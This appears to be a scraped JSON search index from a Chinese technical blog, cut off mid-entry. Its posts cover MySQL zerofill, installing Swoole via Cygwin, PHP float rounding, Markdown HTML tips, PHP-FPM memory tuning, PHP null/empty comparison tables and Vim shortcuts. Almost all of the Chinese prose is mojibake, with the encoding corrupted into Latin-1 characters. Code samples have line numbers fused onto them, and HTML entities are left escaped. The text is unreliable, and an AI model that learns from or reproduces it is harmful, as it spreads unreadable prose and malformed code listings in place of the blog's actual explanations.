Field | Type | Null | Key | Default | Extra |+-------+--------------------------+------+-----+---------+----------------+| id | int(3) unsigned zerofill | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+--------------------------+------+-----+---------+----------------+ æ’å…¥è®°å½•ï¼š 1INSERT INTO tmp_table_b(id, name) VALUES(1, &quot;boo&quot;); æŸ¥çœ‹è®°å½•ï¼š 123456mysql&gt; select * from tmp_table_b;+-----+------+| id | name |+-----+------+| 001 | boo |+-----+------+ æ€»ç»“ å¯¹äºInteger ç±»å‹è€Œè¨€ï¼Œâ€œæ•°å­—â€å¹¶ä¸ä¼šé™åˆ¶å…¶èƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´ã€‚ æœ‰æ— ç¬¦å·ï¼Œä¸ä»…ä¼šé™åˆ¶å…¶èƒ½å­˜å‚¨çš„æœ€å¤§èŒƒå›´ï¼Œè¿˜å¯ä»¥é…ç½®â€œæ•°å­—â€è‡ªåŠ¨è¡¥é›¶ã€‚ å‚è€ƒé“¾æ¥ MySQL Integerç±»å‹ä¸INT(11)","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windows å¦‚ä½•å®‰è£… Swooleï¼Ÿ","slug":"how-to-install-swoole-on-windows","date":"2020-10-21T11:56:53.000Z","updated":"2020-11-26T10:19:33.578Z","comments":true,"path":"how-to-install-swoole-on-windows/","link":"","permalink":"https://www.0x2beace.com/how-to-install-swoole-on-windows/","excerpt":"Swoole æ˜¯ä¸€ä¸ª PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚","text":"Swoole æ˜¯ä¸€ä¸ª PHP çš„åç¨‹é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡å¼•æ“ã€‚ ç›®å‰ä»…æ”¯æŒ Linux(2.3.32 ä»¥ä¸Šå†…æ ¸)ã€FreeBSDã€MacOS ä¸‰ç§æ“ä½œç³»ç»Ÿï¼Œå®ƒå¹¶ä¸æ”¯æŒç›´æ¥åœ¨ Windows ä¸‹å®‰è£…ï¼Œå› ä¸ºWindows ç³»ç»Ÿé»˜è®¤æ²¡æœ‰ä»¥ä¸‹è½¯ä»¶ï¼š gcc-4.8 æˆ–æ›´é«˜ç‰ˆæœ¬ make autoconf å¦‚æœä¸€å®šè¦åœ¨Windows ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ CygWin æˆ– WSL(Windows Subsystem for Linux) ã€‚ è¿™ç¯‡ç¬”è®°å¹¶ä¸ä»‹ç»å¦‚ä½•åœ¨Windows ç³»ç»Ÿä¸­ï¼Œå®‰è£…Cygwinï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥å‚è€ƒCygwin å¿«é€Ÿä¸Šæ‰‹ ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å®‰è£…Cygwin æ—¶ï¼Œè®°å¾—å‹¾é€‰ä»¥ä¸‹è½¯ä»¶åŒ…ï¼š gccã€gcc++ autoconf php-devel pcre2 å®‰è£…Swoole1. å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¸‹è½½ Swoole github pecl gitee 2. ä»æºç ç¼–è¯‘å®‰è£…ä¸‹è½½æºä»£ç åŒ…åï¼Œå°†å…¶æ‹·è´è‡³ Cygwin çš„home ç›®å½•ï¼Œè§£å‹å¹¶è¿›å…¥æ–‡ä»¶å¤¹ã€‚ 1tar -zxvf swoole-src.tgz ç¼–è¯‘å®‰è£…ï¼š 1234cd swoole-src &amp;&amp; \\phpize &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install å¦‚æœå› ä¸ºæŸä¸ªè½¯ä»¶åŒ…ç¼ºå¤±è€Œå¯¼è‡´ç¼–è¯‘å®‰è£…å¤±è´¥ï¼Œåˆ™å¯ä»¥é‡æ–°å®‰è£… Cygwinï¼ˆé‡æ–°å®‰è£…ä¸ç”¨å¸è½½ä¹‹é—´çš„ç‰ˆæœ¬ï¼Œç›´æ¥åœ¨æ­¤å®‰è£…å°±å¥½äº†ï¼‰ã€‚ 3. å¯ç”¨æ‰©å±•ç¼–è¯‘å®‰è£…åˆ°ç³»ç»ŸæˆåŠŸåï¼Œéœ€è¦åœ¨ php.ini ä¸­åŠ å…¥ä¸€è¡Œ extension=swoole.so æ¥å¯ç”¨ Swoole æ‰©å±•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé€šè¿‡è¿™ç§æ–¹å¼å®‰è£…çš„Swooleï¼Œæœ€ç»ˆå­˜åœ¨äºCygwin ç¯å¢ƒä¸­ï¼Œä¸å®¿ä¸»æœºä¸­çš„PHP ç‰ˆæœ¬æ— å…³ã€‚ é€šè¿‡php -m | grep swooleæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP å¸¸è§æµ®ç‚¹æ•°æ“ä½œ","slug":"php-common-floating-point-operations","date":"2020-10-20T11:24:23.000Z","updated":"2020-10-20T11:35:47.611Z","comments":true,"path":"php-common-floating-point-operations/","link":"","permalink":"https://www.0x2beace.com/php-common-floating-point-operations/","excerpt":"æµ®ç‚¹æ•°æ“ä½œåœ¨å®é™…åº”ç”¨ä¸­è¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¸¸è§æ“ä½œã€‚","text":"æµ®ç‚¹æ•°æ“ä½œåœ¨å®é™…åº”ç”¨ä¸­è¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¸¸è§æ“ä½œã€‚ ä¿ç•™Nä½å°æ•°åšå››èˆäº”å…¥æƒ³è¦ä¿ç•™N ä½å°æ•°åŒæ—¶åšå››èˆäº”å…¥çš„æ–¹å¼è¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸‹é¢åˆ—ä¸¾å¸¸ç”¨çš„å‡ ç§ã€‚ sprintfsprintf å‡½æ•°ç”¨äºè¿”å›ä¸€ä¸ªæ ¼å¼åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ã€‚ 123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;, $num); &#x2F;&#x2F; 22.36 %.2f æ˜¯ç›®æ ‡æ ¼å¼ï¼Œå…¶ä¸­2 è¡¨ç¤º2 ä½ï¼Œfè¡¨ç¤ºè§†ä¸ºæµ®ç‚¹æ•°ã€‚ roundround å‡½æ•°ç”¨äºå¯¹æµ®ç‚¹æ•°è¿›è¡Œå››èˆäº”å…¥ã€‚ è¿˜å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°ï¼Œå†³å®šä»ç¬¬å‡ ä½å¼€å§‹å››èˆäº”å…¥ã€‚å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œé»˜è®¤ä»å°æ•°ç‚¹åä¸€ä½å¼€å§‹å››èˆäº”å…¥ã€‚ 1234&lt;?phpecho round(3.4); &#x2F;&#x2F; 3echo round(3.5); &#x2F;&#x2F; 4echo round(22.356, 2); &#x2F;&#x2F; 22.36 ä¿ç•™Nä½å°æ•°ä¸åšå››èˆäº”å…¥123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;,substr(sprintf(&quot;%.3f&quot;, $num), 0, -1)); &#x2F;&#x2F; 22.35 è·å–å°æ•°ä½é•¿åº¦123&lt;?php$num &#x3D; 22.356;echo strlen(substr(strrchr($num, &quot;.&quot;), 1)); &#x2F;&#x2F; 3","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å…³äº Markdown çš„ä¸€äº›æŠ€å·§","slug":"some-tips-about-markdown","date":"2020-10-19T14:04:23.000Z","updated":"2020-10-20T11:23:53.460Z","comments":true,"path":"some-tips-about-markdown/","link":"","permalink":"https://www.0x2beace.com/some-tips-about-markdown/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†Markdown çš„ä¸€äº›ä¸å¸¸ç”¨ï¼Œå´åˆååˆ†æœ‰ç”¨çš„å°æŠ€å·§ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†Markdown çš„ä¸€äº›ä¸å¸¸ç”¨ï¼Œå´åˆååˆ†æœ‰ç”¨çš„å°æŠ€å·§ã€‚ ä»€ä¹ˆæ˜¯Markdownï¼Ÿ Markdown æ˜¯ä¸€ç§è½»é‡çº§æ ‡è®°è¯­è¨€ï¼Œåˆ›å§‹äººä¸ºçº¦ç¿°Â·æ ¼é²ä¼¯ã€‚å®ƒå…è®¸äººä»¬ä½¿ç”¨æ˜“è¯»æ˜“å†™çš„çº¯æ–‡æœ¬æ ¼å¼ç¼–å†™æ–‡æ¡£ï¼Œç„¶åè½¬æ¢æˆæœ‰æ•ˆçš„XHTMLæ–‡æ¡£ã€‚è¿™ç§è¯­è¨€å¸æ”¶äº†å¾ˆå¤šåœ¨ç”µå­é‚®ä»¶ä¸­å·²æœ‰çš„çº¯æ–‡æœ¬æ ‡è®°çš„ç‰¹æ€§ã€‚ â€”â€” ç»´åŸºç™¾ç§‘ Markdown é«˜çº§æŠ€å·§åœ¨Markdown ä¸­ï¼Œå¯ä»¥ç›´æ¥æ’å…¥ HTMLï¼Œç›®å‰æ”¯æŒçš„HTML å…ƒç´ æœ‰ï¼š &lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sub&gt; &lt;sup&gt; &lt;br&gt; ç­‰ é”®ç›˜æ ‡ç­¾å¯ä»¥ä½¿ç”¨&lt;kbd&gt;æ ‡ç­¾ä½¿æ–‡æœ¬çœ‹èµ·æ¥åƒæŒ‰é’®ï¼Œè¿™ä¸å¸¸è§„åå¼•å·æ–‡æœ¬ç•¥æœ‰ä¸åŒã€‚ Copy code with Control + C å¯è§†åŒ–å·®å¼‚å¯ä»¥ä½¿ç”¨åå¼•å·å¯è§†åŒ–å·®å¼‚ï¼Œå¹¶diffæ ¹æ®éœ€è¦çªå‡ºæ˜¾ç¤ºçº¢è‰²æˆ–ç»¿è‰²çš„çº¿ã€‚ 12310 PRINT â€œBASIC IS COOLâ€- 20 GOTO 11+ 20 GOTO 10 éšè—ä¸å¿…è¦çš„è¾“å‡ºæ·»åŠ å†—é•¿çš„é”™è¯¯æ—¥å¿—æˆ–å†—é•¿ç¨‹åºè¾“å‡ºçš„é—®é¢˜å¯ä»¥è§£å†³çš„é”™è¯¯æœ‰å¸®åŠ©çš„ï¼Œä½†å¦‚æœå®ƒå ç”¨é¡µçš„å‚ç›´ç©ºé—´ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨&lt;details&gt;å’Œ&lt;summary&gt;æ ‡ç­¾ã€‚ 12345678910&lt;details&gt;&lt;summary&gt;git clone æˆåŠŸï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ä¿¡æ¯&lt;&#x2F;summary&gt;&lt;pre&gt;Cloning into &#39;php-markdown-blog&#39;...remote: Enumerating objects: 67, done.remote: Counting objects: 100% (67&#x2F;67), done.remote: Compressing objects: 100% (55&#x2F;55), done.remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0Unpacking objects: 100% (67&#x2F;67), done.&lt;&#x2F;details&gt; git clone æˆåŠŸï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ä¿¡æ¯ Cloning into 'php-markdown-blog'... remote: Enumerating objects: 67, done. remote: Counting objects: 100% (67/67), done. remote: Compressing objects: 100% (55/55), done. remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0 Unpacking objects: 100% (67/67), done. ä½¿å›¾åƒæ–‡å­—å±…ä¸­HTML ä¸­çš„&lt;div align=&quot;center&quot;&gt; å±…ç„¶å¯ä»¥ç¥å¥‡çš„åº”ç”¨åœ¨ Markdown ä¸­ï¼Œç„¶æ‰€æœ‰å†…å®¹å±…ä¸­ã€‚ 1234&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;dunetocat.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;p&gt;This is some centered text.&lt;&#x2F;p&gt;&lt;&#x2F;div&gt; This is some centered text. è¾ƒå°çš„æ–‡å­—ä½¿ç”¨&lt;sub&gt;ã€&lt;sup&gt;æ ‡ç­¾ï¼Œå¯ä»¥ä½¿æ–‡å­—å˜å°ï¼Œéå¸¸é€‚åˆåœ¨å›¾åƒä¸‹é¢æ·»åŠ æè¿°ã€‚ 12345&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;megacat-2.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;br&gt;&lt;sup&gt;&lt;strong&gt;Fig 1:&lt;&#x2F;strong&gt; Megatocat into action&lt;&#x2F;sup&gt;&lt;&#x2F;div&gt;View more octocats on the [Octodex](https:&#x2F;&#x2F;octodex.github.com&#x2F;)! Fig 1: Megatocat into action View more octocats on the Octodex å‚è€ƒé“¾æ¥ GitHub ProTips","categories":[{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"}],"tags":[{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"}]},{"title":"PHP-FPM ä¼˜åŒ–â€”â€”å ç”¨å†…å­˜å¤§ä¸é‡Šæ”¾","slug":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release","date":"2020-10-18T07:56:45.000Z","updated":"2020-10-18T07:59:01.020Z","comments":true,"path":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","link":"","permalink":"https://www.0x2beace.com/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","excerpt":"åœ¨ä¼ ç»Ÿçš„ LNMP æ¶æ„ä¸­ï¼Œå¦‚æœWeb åº”ç”¨éƒ¨åˆ†ï¼Œçªç„¶å˜å¾—ç‰¹åˆ«å¡ï¼Œé€šå¸¸éƒ½æ˜¯å†…å­˜è€—å°½å¯¼è‡´ã€‚","text":"åœ¨ä¼ ç»Ÿçš„ LNMP æ¶æ„ä¸­ï¼Œå¦‚æœWeb åº”ç”¨éƒ¨åˆ†ï¼Œçªç„¶å˜å¾—ç‰¹åˆ«å¡ï¼Œé€šå¸¸éƒ½æ˜¯å†…å­˜è€—å°½å¯¼è‡´ã€‚ è¿™é‡Œè¯´çš„å†…å­˜ï¼ŒæŒ‡çš„æ˜¯ç‰©ç†è¿è¡Œå†…å­˜ï¼Œè€Œä¸æ˜¯è™šæ‹Ÿå†…å­˜ï¼ˆSwapï¼‰ã€‚ LNMPæ¶æ„ä¸­PHPæ˜¯è¿è¡Œåœ¨FastCGIæ¨¡å¼ä¸‹ï¼ŒæŒ‰ç…§å®˜æ–¹çš„è¯´æ³•ï¼Œphp-cgiä¼šåœ¨æ¯ä¸ªè¯·æ±‚ç»“æŸçš„æ—¶å€™ä¼šå›æ”¶è„šæœ¬ä½¿ç”¨çš„å…¨éƒ¨å†…å­˜ï¼Œä½†æ˜¯å¹¶ä¸ä¼šé‡Šæ”¾ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯ç»§ç»­æŒæœ‰ä»¥åº”å¯¹ä¸‹ä¸€æ¬¡PHPè¯·æ±‚ã€‚è€Œphp-fpmæ˜¯ FastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼Œç”¨äºæ§åˆ¶phpçš„å†…å­˜å’Œè¿›ç¨‹ç­‰ã€‚ æ‰€ä»¥ï¼Œè§£å†³çš„åŠæ³•å°±æ˜¯é€šè¿‡php-fpm ä¼˜åŒ–æ€»çš„è¿›ç¨‹æ•°å’Œå•ä¸ªè¿›ç¨‹å ç”¨çš„å†…å­˜ï¼Œä»è€Œè§£å†³php-fpm è¿›ç¨‹å ç”¨å†…å­˜å¤§å’Œä¸é‡Šæ”¾å†…å­˜çš„é—®é¢˜ã€‚ æŸ¥çœ‹å½“å‰å ç”¨æƒ…å†µå¦‚æœå‘ç°Web åº”ç”¨å‡ºç°ä¸¥é‡å¡é¡¿ï¼Œè¯·æ±‚è¶…æ—¶ç­‰é—®é¢˜ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹å†…å­˜çš„å ç”¨æƒ…å†µã€‚å¸¸ç”¨çš„å‘½ä»¤æœ‰ï¼šTopã€Glancesã€Free ç­‰ã€‚ ä½¿ç”¨Glances æˆ–è€… Top å‘½ä»¤æŸ¥çœ‹è¿›ç¨‹ï¼Œç„¶åæŒ‰ä¸‹æŒ‰é”® Mï¼Œå¯ä»¥æŸ¥çœ‹ä¸»æœºå½“å‰çš„å†…å­˜å ç”¨æƒ…å†µï¼ŒæŒ‰ç…§å ç”¨å†…å­˜ç”±å¤šåˆ°å°‘æ’åºã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰ php-fpm æ€»è¿›ç¨‹æ•°ï¼š 1ps -ylC php-fpm --sort:rss å…¶ä¸­ rss å°±æ˜¯å†…å­˜å ç”¨æƒ…å†µã€‚ æŸ¥çœ‹å½“å‰php-fpm è¿›ç¨‹çš„å†…å­˜å ç”¨æƒ…å†µåŠå¯åŠ¨æ—¶é—´ï¼š 1ps -e -o &#39;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#39;|grep www|sort -nrk5 å¯ä»¥çœ‹åˆ°æ— è®ºå“ªä¸€ç§æ–¹å¼ï¼Œç»“æœéƒ½æ˜¯ä¸€æ ·çš„ã€‚ æŸ¥çœ‹å½“å‰php-fpmè¿›ç¨‹å¹³å‡å ç”¨å†…å­˜æƒ…å†µï¼š 12ps --no-headers -o &quot;rss,cmd&quot; -C php-fpm | awk &#39;&#123; sum+&#x3D;$1 &#125; END &#123; printf (&quot;%d%s\\n&quot;, sum&#x2F;NR&#x2F;1024,&quot;M&quot;) &#125;&#39;&#x2F;&#x2F; 22M ä¼˜åŒ–é…ç½®è§£å†³ä¸Šé¢é‚£ä¸ªé—®é¢˜çš„æ ¸å¿ƒå°±æ˜¯ php-fpm é…ç½®ä¸­çš„ max_requestsã€‚ å³å½“ä¸€ä¸ª PHP-CGI è¿›ç¨‹å¤„ç†çš„è¯·æ±‚æ•°ç´¯ç§¯åˆ° max_requests ä¸ªåï¼Œè‡ªåŠ¨é‡å¯è¯¥è¿›ç¨‹ï¼Œè¿™æ ·è¾¾åˆ°äº†é‡Šæ”¾å†…å­˜çš„ç›®çš„äº†ã€‚ ä¸€èˆ¬æ¥è¯´ä¸€ä¸ªphp-fpm è¿›ç¨‹å ç”¨çš„å†…å­˜ä¸º30M-40Mï¼Œæ‰€ä»¥æ ¹æ®è‡ªèº«å®é™…æƒ…å†µä½œåˆ¤æ–­ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š å®é™…ç»“æœæ˜¯å¤§äº 30M - 40Mï¼Œé‚£ä¹ˆéœ€è¦è®© php-fpm â€œæ—©ä¸€äº›â€œé‡Šæ”¾å†…å­˜ï¼Œmax_requests çš„æ•°å€¼æ”¹å°ä¸€äº›ã€‚ å®é™…ç»“æœæ˜¯å°äº 30M - 40Mï¼Œåˆ™å¯ä»¥è®© php-fpm â€œæ™šä¸€äº›â€œé‡Šæ”¾å†…å­˜ï¼Œmax_requestsçš„æ•°å€¼æ”¹å¤§ä¸€äº›ã€‚ å‚è€ƒé“¾æ¥ Linuxçš„php-fpmä¼˜åŒ–å¿ƒå¾—-php-fpmè¿›ç¨‹å ç”¨å†…å­˜å¤§å’Œä¸é‡Šæ”¾å†…å­˜é—®é¢˜","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"å¯¹äºNULLã€ç©ºã€0ã€falseç­‰æ•°æ®ç±»å‹çš„ç†è§£","slug":"understanding-of-data-types-such-as-null-empty-0-false-etc","date":"2020-10-17T09:21:51.000Z","updated":"2020-10-17T09:22:32.323Z","comments":true,"path":"understanding-of-data-types-such-as-null-empty-0-false-etc/","link":"","permalink":"https://www.0x2beace.com/understanding-of-data-types-such-as-null-empty-0-false-etc/","excerpt":"ä¹‹æ‰€ä»¥å†³å®šå†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºä¸€ç›´å¯¹ ç©º è¿™ä¸ªæ¦‚å¿µå¾ˆæ¨¡ç³Šï¼Œåœ¨ä»£ç é€»è¾‘ä¸­å¸¸ä¼šé‡åˆ°éœ€è¦åˆ¤æ–­çš„æ—¶å€™ï¼Œæ€»æ˜¯æ¨¡æ‹Ÿä¸¤å¯ã€‚","text":"ä¹‹æ‰€ä»¥å†³å®šå†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºä¸€ç›´å¯¹ ç©º è¿™ä¸ªæ¦‚å¿µå¾ˆæ¨¡ç³Šï¼Œåœ¨ä»£ç é€»è¾‘ä¸­å¸¸ä¼šé‡åˆ°éœ€è¦åˆ¤æ–­çš„æ—¶å€™ï¼Œæ€»æ˜¯æ¨¡æ‹Ÿä¸¤å¯ã€‚ å¸¸è§çš„â€œç©ºâ€æœ‰ä»¥ä¸‹è¿™äº›ï¼š æ•´å½¢0ï¼š0 å­—ç¬¦1ï¼š1 å­—ç¬¦ç©ºï¼šâ€â€ å­—ç¬¦é›¶ï¼šâ€0â€ ç©ºæ•°ç»„ï¼š[] true false null NUll ä¸Šé¢çš„é‚£äº›éƒ½å¥½ç†è§£ï¼Œéƒ½æ˜¯å¸¸è§çš„ï¼Œé‡ç‚¹ä»‹ç»ä¸€ä¸‹NULLã€‚ NULL æ˜¯ä»€ä¹ˆï¼Ÿ Nullæ˜¯åœ¨è®¡ç®—æœºå…·æœ‰ä¿ç•™çš„å€¼ï¼Œå¯ä»¥ç”¨äºæŒ‡é’ˆä¸å»å¼•ç”¨å¯¹è±¡ï¼Œç°åœ¨å¾ˆå¤šç¨‹åºéƒ½ä¼šä½¿ç”¨æŒ‡é’ˆæ¥è¡¨ç¤ºæ¡ä»¶ï¼Œä½†æ˜¯åœ¨ä¸åŒçš„è¯­è¨€ä¸­ï¼Œå«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ã€‚ è¿™é‡Œæˆ‘ä»¬åªä»‹ç» PHP ä¸­çš„ NULLã€‚ åœ¨ PHP ä¸­ï¼Œè¡¨ç¤ºä¸€ä¸ªå˜é‡æ²¡æœ‰èµ‹å€¼ã€æˆ–è€…æ˜¯è¢«èµ‹å€¼çš„å€¼ä¸º NULLï¼Œä»¥åŠè¢« unset çš„ã€‚ ä½¿ç”¨PHP å‡½æ•°å¯¹å˜é‡è¿›è¡Œæ¯”è¾ƒï¼š è¡¨è¾¾å¼ gettype() empty() is_null() isset() boolean : if($x) $x = &quot;&quot;; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = &quot;1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;0&quot;; string TRUE FALSE TRUE FALSE $x = &quot;-1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;php&quot;; string FALSE FALSE TRUE TRUE $x = &quot;true&quot;; string FALSE FALSE TRUE TRUE $x = &quot;false&quot;; string FALSE FALSE TRUE TRUE æ¾æ•£åˆ¤æ–­ == TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE 1 TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE FALSE TRUE TRUE -1 TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE &quot;1&quot; TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE TRUE FALSE TRUE array() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE &quot;php&quot; TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE ä¸¥æ ¼æ¯”è¾ƒ === TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE &quot;1&quot; FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE &quot;php&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE å‚è€ƒé“¾æ¥PHP ç±»å‹æ¯”è¾ƒè¡¨","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Vim å¸¸ç”¨å¿«æ·é”®æ€»ç»“","slug":"summary-of-vim-commonly-used-shortcut-keys","date":"2020-10-16T11:16:43.000Z","updated":"2020-10-18T08:12:31.937Z","comments":true,"path":"summary-of-vim-commonly-used-shortcut-keys/","link":"","permalink":"https://www.0x2beace.com/summary-of-vim-commonly-used-shortcut-keys/","excerpt":"Vim æ˜¯æˆ‘åœ¨Linux ä¸‹æ¯”è¾ƒå¸¸ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„æ“ä½œã€‚","text":"Vim æ˜¯æˆ‘åœ¨Linux ä¸‹æ¯”è¾ƒå¸¸ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„æ“ä½œã€‚ åŸºæœ¬æ“ä½œ ç§»åŠ¨åˆ°è¡Œé¦–ï¼š0 ç§»åŠ¨åˆ°è¡Œå°¾ï¼š$ å…‰æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶å¼€å§‹ä½ç½®ï¼šgg å…‰æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶ç»“æŸä½ç½®: shift + g åˆ é™¤æ‰€æœ‰å†…å®¹ï¼šggdG å•è¡Œåˆ é™¤ï¼šdd å•è¡Œå¤åˆ¶ï¼šyy ç²˜è´´ï¼šp å¤åˆ¶å…¨éƒ¨å†…å®¹ï¼šggyG ç§»åŠ¨åˆ°æŒ‡å®šè¡Œåœ¨vim 